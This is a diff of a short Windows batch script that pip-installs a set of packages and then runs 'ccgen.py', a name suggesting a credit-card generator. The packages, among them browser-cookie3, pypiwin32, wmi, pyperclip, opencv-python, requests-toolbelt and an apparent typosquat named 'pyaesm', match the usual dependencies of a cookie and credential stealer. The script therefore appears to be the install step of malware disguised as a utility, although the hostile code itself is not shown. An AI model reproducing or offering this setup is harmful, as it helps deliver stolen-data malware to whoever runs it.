@@ -1,14 +1,24 @@
 cls
-pip install subprocess
-pip install customtkinter
-pip install shutil
-pip install base64
-pip install sqlite3
-pip install socket
-pip install zipfile
-pip uninstall crypto 
-pip uninstall pycrypto 
-pip install pycryptodome
-pip install win32crypt
+pip install cryptography
+
+pip install opencv-python
+
+pip install psutil
+
+pip install pycountry
+
+pip install pyperclip
+
+pip install pypiwin32
+
+pip install requests
+
+pip install requests-toolbelt
+
+pip install wmi
+
+pip install pyaesm
+
+pip install browser-cookie3
 cls
 python ccgen.py
